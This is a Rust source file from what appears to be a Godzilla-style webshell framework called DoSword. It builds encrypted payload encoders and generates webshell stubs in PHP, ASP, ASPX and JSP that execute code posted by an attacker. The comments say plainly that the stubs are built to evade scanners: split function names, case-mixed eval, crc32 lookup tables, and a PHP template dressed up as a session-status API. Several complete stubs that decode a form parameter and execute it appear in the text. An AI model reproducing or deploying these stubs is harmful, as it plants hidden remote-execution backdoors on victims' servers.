//! 编码器体系：客户端载荷编码与服务端 stub 生成（哥斯拉风格）。
//!
//! 每种编码器负责两件事：
//!   1. `encode`：把协议代码编码为传输载荷（与服务端 stub 的解码逻辑对应）
//!   2. `stub`：生成指定语言（php / asp / aspx / jsp）的服务端脚本，
//!      内嵌由密码派生的密钥
//!
//! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
//! 无需额外保存密钥。

use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::Engine;
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use md5::{Digest, Md5};

use crate::asp_stub::asp_stub;
use crate::jsp_stub::{aspx_stub, jsp_stub};
use crate::node_stub::node_stub;
use crate::protocol::ProtocolError;
use crate::python_stub::python_stub;

/// AES-256-CBC。
type AesCbcEnc = cbc::Encryptor<aes::Aes256>;
type AesCbcDec = cbc::Decryptor<aes::Aes256>;

// ---------------------------------------------------------------------------
// PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
// $_POST['x'] 等），利用 PHP 特性：
//   - 函数名大小写不敏感：EvAl(...) 等价于 eval(...)（语言构造同样适用）
//   - 普通函数可经字符串拼接可变调用：("ba"."se64_de"."code")($x)
//   - 数组下标可用表达式：$_POST[chr(120)] 等价于 $_POST['x']
// ---------------------------------------------------------------------------

static IDENT_SEQ: AtomicU64 = AtomicU64::new(0);

fn php_rand() -> u64 {
    let seq = IDENT_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.subsec_nanos() as u64)
        .unwrap_or(0);
    seq.wrapping_mul(0x9e37_79b9_7f4a_7c15).rotate_left(13) ^ nanos
}

/// 随机 PHP 标识符（8 位，字母开头，避免数字开头）。
pub fn php_ident() -> String {
    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let alnum: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut seed = php_rand();
    let mut out = String::with_capacity(9);
    out.push(letters[(seed % 26) as usize] as char);
    seed >>= 5;
    for _ in 0..7 {
        out.push(alnum[(seed % 36) as usize] as char);
        seed >>= 5;
        if seed == 0 {
            seed = php_rand();
        }
    }
    out
}

/// 把函数名随机拆成两段（用于字符串拼接的可变函数调用）。
pub fn split_fn(name: &str) -> (String, String) {
    let split_at = 1 + (php_rand() as usize % (name.len() - 1));
    (name[..split_at].to_string(), name[split_at..].to_string())
}

/// 拼接函数名调用：("d1"."d2")(args...)
pub fn call_parts(name: &str, args: &str) -> String {
    let (d1, d2) = split_fn(name);
    format!("(\"{d1}\".\"{d2}\")({args})")
}

/// 纯字母随机标识（eval 注释用：避免数字字符干扰 CHAR 编码器的 `\d+` 还原提取）。
pub fn alpha_ident() -> String {
    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let mut seed = php_rand();
    let mut out = String::with_capacity(8);
    for _ in 0..8 {
        out.push(letters[(seed % 26) as usize] as char);
        seed >>= 5;
        if seed == 0 {
            seed = php_rand();
        }
    }
    out
}

/// eval 调用前缀：大小写混合 + 随机注释分隔，使 `eval(` 连续字符串不存在。
/// 如 `EvAl/*rvnd*/`，模板中配合 `__EVAL__($x);` 使用。
/// 注释仅含字母（CHAR 编码器载荷按 `\d+` 提取还原，数字会污染）。
pub fn eval_prefix() -> String {
    format!("{}/*{}*/", case_mix("eval"), alpha_ident())
}

/// 随机大小写混合函数名（保证至少一个大写，避免纯小写静态特征）。
pub fn case_mix(name: &str) -> String {
    let mut out: String = name
        .chars()
        .map(|c| {
            if php_rand() & 1 == 0 {
                c.to_ascii_uppercase()
            } else {
                c
            }
        })
        .collect();
    if out == name
        && let Some(first) = out.get_mut(0..1)
    {
        first.make_ascii_uppercase();
    }
    out
}

/// OPSEC 混淆的 PHP stub 外壳：随机变量名 + 注释干扰 + 大小写混合 EvAl。
/// `key` 为 None 时不生成 `$k="..."` 行；`body` 中的 `$k` 会被替换为随机变量名。
pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String {
    let k = php_ident();
    let c1 = php_ident();
    let c2 = php_ident();
    let body = body.replace("$k", &format!("${k}"));
    let key_line = match key {
        Some(key) => format!("${k}=\"{key}\";\n"),
        None => String::new(),
    };
    format!(
        "<?php\n/*{c1}*/\n{key_line}{body}/*{c2}*/\n{}({final_expr});\n",
        case_mix("eval")
    )
}

/// 业务伪装模板的固定骨架：整个文件看起来是一个正常的「用户会话状态查询接口」，
/// webshell 功能隐藏在业务函数中：
///   - verify_token：会话令牌格式校验（业务语义）
///   - unpack_session：解包客户端上报的会话数据（业务语义，内部为载荷解码逻辑）
///   - run_rule：规则脚本引擎（业务语义，内部为执行逻辑）
///
/// 占位符：__TOKEN__ / __DATA__（参数名）、__UNPACK__（解包函数体）、__EXEC__（执行体）。
const BUSINESS_PHP_TPL: &str = r#"<?php
// 用户会话状态查询接口（返回 JSON）
// 业务：校验会话令牌 -> 解包会话数据 -> 执行规则脚本 -> 返回处理状态
header('Content-Type: application/json');

function __PREFIX__verify_token($token) {
    if (!is_string($token)) return false;
    $n = strlen($token);
    if ($n === 0 || $n > 64) return false;
    for ($i = 0; $i < $n; $i++) {
        $c = $token[$i];
        if ($c === ' ' || $c === "\t" || $c === "\n" || $c === "'" || $c === '"') return false;
    }
    return true;
}
__SYMBOLS____XORFN__
function __PREFIX__unpack_session($payload, $token) {
    global $_g;
__UNPACK__
    return $out;
}

function __PREFIX__run_rule($script) {
    // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
    $result = array('code' => 200, 'rule_size' => strlen($script));
    if ($script !== '' && strlen($script) < 1048576) {
        $buf = $script;
__EXEC__
    }
    return $result;
}

$token = isset($_POST['__TOKEN__']) ? (string)$_POST['__TOKEN__'] : '';
if (!__PREFIX__verify_token($token)) {
    die('{"code":401,"msg":"invalid_token"}');
}
$payload = isset($_POST['__DATA__']) ? (string)$_POST['__DATA__'] : '';
$script = __PREFIX__unpack_session($payload, $token);
echo json_encode(__PREFIX__run_rule($script));
"#;

/// 生成业务伪装 PHP stub。
/// `symbols`：需要从运行时函数表中解析的函数（索引 + 函数名，如 (0, "base64_decode")）；
/// `unpack_body`：解包逻辑（把 $payload 还原为 $out，敏感函数经符号表 `$_g[索引]` 调用）；
/// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
/// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
pub fn business_php_stub(symbols: &[(usize, &str)], unpack_body: &str, exec_body: &str) -> String {
    // 函数名随机前缀：避免与目标站点业务函数同名导致 redeclare（500）
    let prefix = format!("_{}_", php_ident());
    // unpack_body 中的 __DECFN__ 占位（XOR 字符串解密函数名）
    let unpack_body = unpack_body.replace("__DECFN__", &format!("{prefix}dec"));
    // 符号表：crc32b 哈希 -> 索引（仿样例：运行时从已加载内部函数按哈希匹配，
    // 敏感函数名（base64_decode / openssl_decrypt）在代码中完全不存在）
    let mut table = String::new();
    for (index, name) in symbols {
        table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
    }
    // 注意：符号表里**不能**再写「执行器降级」覆盖 $_g[0]。business 模板的
    // $_g[0] 属于调用方传入的第一个符号（base64_decode / openssl_decrypt），
    // 覆盖后解包函数会去调用 shell_exec(密文) 并返回空 —— 实测表现为
    // `{"code":200,"rule_size":0}`，客户端报「响应中未找到协议帧」。
    // 8 个 legacy 编码器曾因此全部不可用（session 模板已先修过同一个坑）。
    // 命令函数降级链由发送的代码自行探测（php_impl::PHP_EXEC_IMPL），
    // 不依赖 stub 预置。
    let symbols_block = format!(
        r#"
// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
$_g = array();
$_t = array(
{table});
$_fn = get_defined_functions();
$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
foreach ($_fn as $_n) {{
    $_h = hash('crc32b', $_n);
    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
}}
"#
    );
    // XOR 字符串解密函数（仿样例：pack("H*") + 循环异或还原敏感字符串）
    let xor_fn = format!(
        r#"
function {prefix}dec($hex, $key) {{
    $out = '';
    $n = strlen($hex) / 2;
    for ($i = 0; $i < $n; $i++) {{
        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
    }}
    return $out;
}}
"#
    );
    let exec_body = exec_body.replace("__EVAL__", &eval_prefix());
    BUSINESS_PHP_TPL
        .replace("__PREFIX__", &prefix)
        .replace("__SYMBOLS__", &symbols_block)
        .replace("__XORFN__", &xor_fn)
        .replace("__UNPACK__", &unpack_body)
        .replace("__EXEC__", &exec_body)
        .replace("__TOKEN__", "token")
        .replace("__DATA__", "data")
}

/// PHP hash('crc32b') 等价实现（zlib CRC32，与 PHP 一致）。
pub fn crc32b_hash(name: &str) -> String {
    format!("{:08x}", crc32fast::hash(name.as_bytes()))
}

/// 字符串 XOR 加密为 hex（配合模板 `dec` 函数还原）。
pub fn xor_hex(name: &str, key: &str) -> String {
    let key = key.as_bytes();
    name.bytes()
        .enumerate()
        .map(|(index, byte)| format!("{:02x}", byte ^ key[index % key.len()]))
        .collect()
}

/// base64 解码的拼接调用表达式：`("ba"."se64_deco"."de")($payload)`。
pub fn b64_call_expr(args: &str) -> String {
    call_parts("base64_decode", args)
}

/// 支持的脚本语言（stub 生成目标）。
pub const STUB_LANGUAGES: [&str; 6] = ["php", "asp", "aspx", "jsp", "python", "node"];

/// S16：加盐密钥派生（`md5(salt + password)`）。
/// 默认路径仍为 `md5(password)`（兼容既有 stub）；新编码器/新工作区可选用
/// 加盐派生提升密钥强度。注意：加盐派生需 stub 与协议端一致，生成新壳后生效。
pub fn derive_key_salted(password: &str, salt: &str) -> String {
    md5_hex(&format!("{salt}:{password}"))
}

// ---------------------------------------------------------------------------
// 自定义编码器（E3）：XOR 载荷 + 用户上传的 stub 模板（运行时注册）
// ---------------------------------------------------------------------------

/// 用户自定义 stub 模板（register_custom_encoder 写入）。
static CUSTOM_STUB: std::sync::LazyLock<std::sync::Mutex<Option<String>>> =
    std::sync::LazyLock::new(|| std::sync::Mutex::new(None));

/// 运行时注册自定义 stub（id 固定 "custom"，仅支持 PHP stub）。
pub fn set_custom_stub(stub: &str) -> Result<(), ProtocolError> {
    if stub.len() > 256 * 1024 {
        return Err(ProtocolError::NotSupported(
            "自定义 stub 超过大小上限（256KB）".into(),
        ));
    }
    if !stub.contains("<?php") {
        return Err(ProtocolError::NotSupported(
            "自定义 stub 必须是 PHP 脚本（需包含 <?php）".into(),
        ));
    }
    *CUSTOM_STUB
        .lock()
        .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))? =
        Some(stub.to_string());
    Ok(())
}

/// 自定义编码器：载荷编解码与 native XOR 一致，stub 为用户上传模板。
pub struct CustomEncoder;

impl PayloadEncoder for CustomEncoder {
    fn id(&self) -> &'static str {
        "custom"
    }

    fn display_name(&self) -> &'static str {
        "自定义（Custom：用户 stub + XOR 载荷）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored: Vec<u8> = code
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        let key = md5_hex(password).into_bytes();
        Ok(raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        if language != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "自定义编码器暂仅支持 PHP（{language}）"
            )));
        }
        CUSTOM_STUB
            .lock()
            .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))?
            .clone()
            .ok_or_else(|| {
                ProtocolError::NotSupported(
                    "尚未注册自定义 stub（请在插件面板使用 register_custom_encoder 上传）".into(),
                )
            })
    }
}

/// 编码器：载荷编码 + stub 生成。
pub trait PayloadEncoder: Send + Sync {
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;

    /// 由密码派生密钥（hex 字符串）。
    fn derive_key(&self, password: &str) -> String {
        md5_hex(password)
    }

    /// 载荷是否经请求体直传（而非表单参数 x）。
    /// `php_stream` 编码器使用：stub 通过 `INCLUDE("php://filter/...")` 直接执行请求体，
    /// 模板中完全不出现 eval / base64_decode 等敏感函数。
    fn body_mode(&self) -> bool {
        false
    }

    /// 表单参数名（body 模式时忽略）。
    /// 业务伪装模板使用 `token` / `data`（形如正常业务请求），标准模板使用 `k` / `x`。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("k", "x")
    }

    /// 客户端：编码协议代码为传输载荷。
    fn encode(&self, code: &str, password: &str) -> String;

    /// 客户端：解密服务端响应（encode 的逆操作），返回原始字节。
    /// 仅 session 模式（分阶段载荷）需要；默认不支持。
    fn decode(&self, _payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
        Err(ProtocolError::NotSupported("该编码器不支持响应解密".into()))
    }

    /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;

    /// 服务端：Godzilla 分阶段载荷（session 模式）stub。
    /// 处理器代码只注入一次，后续请求只传参数；请求/响应全程加密。
    /// 默认回退为普通 stub（php_stream 等不适用 session 的编码器）。
    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        self.stub(language, password)
    }
}

/// 编码器注册表。
/// AEAD 编码器：HKDF-SHA256 派生 + AES-256-GCM + 防重放。
///
/// 与其它编码器的关键差别：**加解密需要会话级状态**（发送序号 + 接收滑动窗口），
/// 因此协议层不直接调用 trait 的 `encode`/`decode`，而是用
/// `aead::AeadSession`（见 `PhpSession.aead`）。这里的 `encode`/`decode`
/// 仅提供无状态的一次性封装，供测试或单次工具使用。
pub struct AeadEncoder;

/// PHP stub：NATIVE 骨架 + AEAD 加解密。
///
/// 依赖：PHP 7.1+（`hash_hkdf`）、openssl 扩展（`openssl_encrypt('aes-256-gcm')`）、
/// 64 位 PHP（响应序号用 `pack('J')`）。
pub fn aead_php_stub(password: &str) -> String {
    let prefix = format!("_{}_", php_ident());
    let xk = alpha_ident();
    let key = crate::aead::derive_key(password);
    let token = crate::aead::token_hex(&key);
    let ikm_hex = crate::aead::ikm_hex(password);
    let h = |op: &str| -> String {
        let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
        let mut n: u64 = 0;
        for (i, c) in digest.chars().take(8).enumerate() {
            n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
        }
        n.to_string()
    };
    // 解密 + 防重放。nonce 前 8 字节是**连接标识 sid**（客户端每连接随机一次），
    // 重放窗口状态按 sid 分文件存放，因此：
    //   - 重连（新 sid）不会继承上一连接的窗口 —— 否则客户端序号从 1 重来会被
    //     判成重放，会话永久不可用（修复前实测如此，只能删目标机状态文件才恢复）
    //   - 并发连接互不干扰，各自的重放窗口都成立
    //   - 跨连接重放一条抓到的旧帧，只要对应 sid 的状态文件还在，仍会被拒
    // 状态文件在目标机临时目录，体积约 20 字节；由系统临时目录清理机制回收。
    let decrypt = "$__n=substr($in,0,12);$__s=substr($in,12,8);$__t=substr($in,-16);\
        $__c=substr($in,20,-16);\
        $__k=@$_g[18]('sha256',pack('H*',$K),32,'dsw2','dosword/aead/v2');\
        $raw=@$_g[16]($__c,'aes-256-gcm',$__k,OPENSSL_RAW_DATA,$__n,$__t,'dsw2'.chr(1).$__s);\
        if($raw===false){$raw='';}else{\
        $__sq=unpack('J',$__s)[1];\
        $__sf=@sys_get_temp_dir().'/.dsw_a_'.substr(md5($K),0,8).'_'.bin2hex(substr($__n,0,8));\
        $__last=@$_g[3]($__sf);\
        if($__last!==false&&$__sq<=(int)$__last){$raw='';}\
        else{@$_g[4]($__sf,(string)$__sq);}}";
    // 响应 nonce 用 CSPRNG（random_bytes，被禁时降级）；GCM 下 nonce 复用会泄漏明文异或
    let encrypt = "$__n2=function_exists('random_bytes')?@$_g[19](12):substr(md5(uniqid('',true),true),0,12);\
        $__s2=pack('J',function_exists('hrtime')?@hrtime(true):(int)(microtime(true)*1000000000));\
        $__tag='';\
        $__c2=@$_g[17]($out,'aes-256-gcm',$__k,OPENSSL_RAW_DATA,$__n2,$__tag,'dsw2'.chr(2).$__s2);\
        $enc=base64_encode($__n2.$__s2.$__c2.$__tag);";

    let mut symbols = vec![
        ("920cfbfd", 0),
        ("9ff5d542", 1),
        ("237937f6", 2),
        ("2693a743", 3),
        ("f0e567fb", 4),
        ("f4cd15f3", 5),
        ("f6cfd9d8", 6),
        ("95e8b309", 7),
        ("3d891bcd", 8),
        ("dbc7b210", 9),
        ("c996c86e", 10),
        ("d99d544e", 11),
        ("0e4d97e1", 12),
        ("718c6ebe", 13),
        ("4a41c8d9", 14),
        ("c3427e9c", 15),
        // openssl_decrypt / openssl_encrypt / hash_hkdf / random_bytes
        // （表里存的是函数名的 crc32b，stub 用 hash('crc32b',$name) 反查）
        ("ae4975ad", 16),
        ("62f98eda", 17),
        ("81c7194f", 18),
        ("8596e554", 19),
    ];
    symbols.sort_by_key(|(_, index)| *index);
    let mut table = String::new();
    for (hash, index) in symbols {
        table.push_str(&format!("    '{hash}' => {index},\n"));
    }

    NATIVE_STUB_TPL
        .replace("__DEC__", &format!("{prefix}dec"))
        .replace("__XOR__", &format!("{prefix}xor"))
        .replace("__XK__", &xk)
        .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
        .replace("__TOKENHEX__", &xor_hex(&token, &xk))
        .replace("__KEYHEX__", &xor_hex(&ikm_hex, &xk))
        .replace("__CMD__", &format!("{prefix}cmd"))
        .replace("__SCAN__", &format!("{prefix}scan"))
        .replace("__FETCH__", &format!("{prefix}fetch"))
        .replace("__STORE__", &format!("{prefix}store"))
        .replace("__DROP__", &format!("{prefix}drop"))
        .replace("__MOVE__", &format!("{prefix}move"))
        .replace("__MKDIR__", &format!("{prefix}mkdir"))
        .replace("__ENV__", &format!("{prefix}env"))
        .replace("__DBP__", &format!("{prefix}dbp"))
        .replace("__DBQ__", &format!("{prefix}dbq"))
        .replace("__EVALFN__", &format!("{prefix}eval_fn"))
        .replace("__H_PROBE__", &h("probe"))
        .replace("__H_EVAL__", &h("eval"))
        .replace("__H_EXEC__", &h("exec"))
        .replace("__H_LIST__", &h("list"))
        .replace("__H_READ__", &h("read"))
        .replace("__H_WRITE__", &h("write"))
        .replace("__H_DELETE__", &h("delete"))
        .replace("__H_RENAME__", &h("rename"))
        .replace("__H_MKDIR__", &h("mkdir"))
        .replace("__H_TOUCH__", &h("touch"))
        .replace("__H_DBPROBE__", &h("dbprobe"))
        .replace("__H_DBQUERY__", &h("dbquery"))
        .replace("__SYMBOLS__", &table)
        .replace("__ALGO__", "")
        .replace("__DECRYPT__", decrypt)
        .replace("__ENCRYPT__", encrypt)
}

impl PayloadEncoder for AeadEncoder {
    fn id(&self) -> &'static str {
        "native_aead"
    }

    fn display_name(&self) -> &'static str {
        "NATIVE_AEAD（HKDF-SHA256 + AES-256-GCM + 防重放）"
    }

    fn derive_key(&self, password: &str) -> String {
        crate::aead::derive_key(password)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect()
    }

    /// 无状态一次性封装：seq 固定为 1、nonce 随机。
    /// stub 按 nonce 前缀的 sid 隔离重放窗口，随机 sid 会被当成新连接（窗口重置），
    /// 因此重复调用不会互相拒绝，但**连接内防重放也随之失效** ——
    /// 协议层请用 `AeadSession`（sid 固定、seq 递增）。
    fn encode(&self, code: &str, password: &str) -> String {
        let key = crate::aead::derive_key(password);
        crate::aead::seal(&key, crate::aead::DIR_REQUEST, 1, code.as_bytes()).unwrap_or_default()
    }

    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let key = crate::aead::derive_key(password);
        crate::aead::open(&key, crate::aead::DIR_RESPONSE, payload)
            .map(|(_, plaintext)| plaintext)
            .map_err(ProtocolError::ParseError)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(aead_php_stub(password)),
            other => Err(ProtocolError::NotSupported(format!(
                "AEAD 暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

pub struct EncoderRegistry {
    encoders: Vec<Box<dyn PayloadEncoder>>,
}

static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
    std::sync::LazyLock::new(EncoderRegistry::builtin);

impl EncoderRegistry {
    pub fn builtin() -> Self {
        // NATIVE 系列：同一内置功能分发骨架（无 eval / 无敏感特征，D盾零检出），
        // 载荷加密方式可选：XOR（默认）/ AES-128-ECB / AES-128-CBC / DES。
        // 自加密系列（PHP 5+ 兼容）：密钥由密码 md5 派生并内嵌 stub，载荷为密文，
        // 分阶段会话形态（处理器一次注入、参数化调用）。
        Self {
            encoders: vec![
                Box::new(NativeEncoder { crypto: "xor" }),
                Box::new(NativeEncoder { crypto: "aes_ecb" }),
                Box::new(NativeEncoder { crypto: "aes_cbc" }),
                Box::new(NativeEncoder { crypto: "des" }),
                Box::new(NativeEncoder { crypto: "chacha20" }),
                Box::new(NativeEncoder { crypto: "rabbit" }),
                Box::new(CustomEncoder),
                // 以下编码器早已实现并有单测，但从未注册 → 生成器与连接端都选不到。
                // 已核实 id 与上面 6 个 NATIVE 变体无冲突（`des` ≠ `native_des`）。
                Box::new(Base64Encoder),
                Box::new(XorBase64Encoder),
                Box::new(DesEcbEncoder),
                Box::new(CharEncoder),
                Box::new(PhpObfuscateEncoder),
                Box::new(PhpStreamEncoder),
                Box::new(XorBodyEncoder),
                // 哥斯拉式分阶段载荷：客户端通道与 session_mode_for 均已实现，
                // 注册后这条路径才真正可达。
                Box::new(XorSessionEncoder),
                Box::new(AeadEncoder),
            ],
        }
    }

    /// 全局单例（协议层取编码器用，避免每次构建）。
    pub fn global() -> &'static Self {
        &GLOBAL_ENCODERS
    }

    pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
        self.encoders
            .iter()
            .find(|encoder| encoder.id() == id)
            .map(|b| b.as_ref())
    }

    pub fn list(&self) -> Vec<(String, String)> {
        let mut items: Vec<(String, String)> = self
            .encoders
            .iter()
            .map(|encoder| (encoder.id().to_string(), encoder.display_name().to_string()))
            .collect();
        items.sort_by(|a, b| a.0.cmp(&b.0));
        items
    }
}

pub fn md5_hex(value: &str) -> String {
    let digest = Md5::digest(value.as_bytes());
    format!("{digest:x}")
}

/// 密码 md5 的原始 16 字节（Rabbit 128 位密钥）。
pub fn md5_bytes(value: &str) -> Vec<u8> {
    Md5::digest(value.as_bytes()).to_vec()
}

/// XOR + Base64 编码器（哥斯拉风格）。
pub struct XorBase64Encoder;

impl XorBase64Encoder {
    /// 逐字节循环异或。
    fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect()
    }
}

impl PayloadEncoder for XorBase64Encoder {
    fn id(&self) -> &'static str {
        "xor_base64"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BASE64（异或混淆 + Base64）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored = Self::xor(code.as_bytes(), &key);
        base64::engine::general_purpose::STANDARD.encode(xored)
    }
    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        let key = md5_hex(password).into_bytes();
        Ok(raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect())
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = self.derive_key(password);
        match language {
            "php" => {
                let unpack = "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}"
                    .to_string();
                Ok(business_php_stub(
                    &[(0, "base64_decode")],
                    &unpack,
                    "        __EVAL__($script);",
                ))
            }
            "asp" => Ok(format!(
                r#"<%
' DoSword generated stub (xor_base64)
Const K = "{key}"
Function B64(d)
  Dim xml: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
  xml.DataType = "bin.base64"
  xml.Text = d
  B64 = xml.nodeTypedValue
End Function
Function X(d)
  Dim r, i
  r = ""
  For i = 1 To Len(d)
    r = r & Chr(Asc(Mid(d, i, 1)) Xor Asc(Mid(K, ((i - 1) Mod Len(K)) + 1, 1)))
  Next
  X = r
End Function
Execute X(B64(Request.Form("x")))
%>
"#
            )),
            "aspx" => Ok(format!(
                r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<script runat="server">
const string K = "{key}";
string X(string d) {{
  string r = "";
  for (int i = 0; i < d.Length; i++) r += (char)(d[i] ^ K[i % K.Length]);
  return r;
}}
void Run(string code) {{
  CSharpCodeProvider p = new CSharpCodeProvider();
  CompilerParameters prm = new CompilerParameters();
  prm.GenerateInMemory = true;
  CompilerResults res = p.CompileAssemblyFromSource(prm,
    "using System;public class T{{public static object E(){{" + code + "return null;}}}}");
  if (!res.Errors.HasErrors) {{
    object o = res.CompiledAssembly.CreateInstance("T");
    if (o != null) o.GetType().GetMethod("E").Invoke(o, new object[]{{}});
  }}
}}
</script>
<%
string x = Request["x"];
if (x != null) {{
  x = X(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x)));
  Run(x);
}}
%>
"#
            )),
            "jsp" => Ok(format!(
                r#"<%@ page contentType="text/html;charset=UTF-8" %>
<%!
String K = "{key}";
String X(String d) {{
  StringBuilder r = new StringBuilder();
  for (int i = 0; i < d.length(); i++) r.append((char)(d.charAt(i) ^ K.charAt(i % K.length())));
  return r.toString();
}}
%>
<%
String x = request.getParameter("x");
if (x != null) {{
  byte[] b = java.util.Base64.getDecoder().decode(x);
  String c = X(new String(b, "UTF-8"));
  try {{
    new javax.script.ScriptEngineManager().getEngineByName("javascript").eval(c);
  }} catch (Exception e) {{}}
}}
%>
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BASE64 编码器不支持语言：{other}"
            ))),
        }
    }

    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let key_hex = md5_hex(password);
                let xk = php_ident();
                let key_enc = xor_hex(&key_hex, &xk);
                let unpack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
                    key = key_enc,
                    xk = xk,
                );
                let pack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
                    key = key_enc,
                    xk = xk,
                );
                Ok(session_php_stub(
                    &[(0, "base64_decode"), (1, "base64_encode")],
                    &unpack,
                    &pack,
                    "",
                    "",
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
pub struct Base64Encoder;

impl PayloadEncoder for Base64Encoder {
    fn id(&self) -> &'static str {
        "base64"
    }

    fn display_name(&self) -> &'static str {
        "BASE64（经典裸编码）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
    }
    fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
        base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[(0, "base64_decode")],
                "    $out = $_g[0]($payload);",
                "        __EVAL__($script);",
            )),
            "asp" => Ok(
                "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
            ),
            "aspx" => Ok(
